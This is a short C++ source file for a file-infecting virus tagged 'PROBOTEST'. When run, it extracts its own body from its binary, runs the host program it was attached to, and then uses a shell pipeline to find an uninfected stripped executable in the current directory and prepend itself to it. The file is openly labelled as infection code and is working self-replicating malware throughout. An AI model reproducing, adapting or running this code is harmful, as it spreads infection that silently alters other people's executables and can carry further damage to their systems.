#include <iostream>
#include <fstream>

const char* IDENTIFIER = "PROBOTEST";

const int MYSIZE = 14310;

using namespace std;

int main (int argc, char** argv) {
    int c;
    string exe = "exe", vir = "vir";
    string me = (string)argv[0];
    ifstream fi(me);
    ofstream fo(exe);
    ofstream fv(vir);
    if (fi.is_open() && fo.is_open() && fv.is_open()) {
        // Write "vir"
        for (int i = 0; i < MYSIZE; i++) fv << (char)fi.get();
        // Write "exe"
        fi.seekg(MYSIZE, fi.beg);
        while ((c = fi.get()) != -1) fo << (char)c;
        fi.close();
        fo.close();
        fv.close();
        // Excute original program and delete when ready
        c = system("chmod u+x exe;./exe;rm -f exe");
        // Infect one executable
        c = system("VIR=$( \
ls | grep -v '^hi$' | \
while read n; \
do \
  grep -q PROBOTEST $n || echo \"$n\"; \
done | \
tail -1); \
if [ ! -z \"$VIR\" ]; then \
file $VIR | grep -q stripped$ && (\
mv $VIR ${VIR}__ && \
cat vir ${VIR}__ >$VIR && \
chmod ugo+x $VIR \
) \
fi; \
rm -f ${VIR}__ vir");
    }
}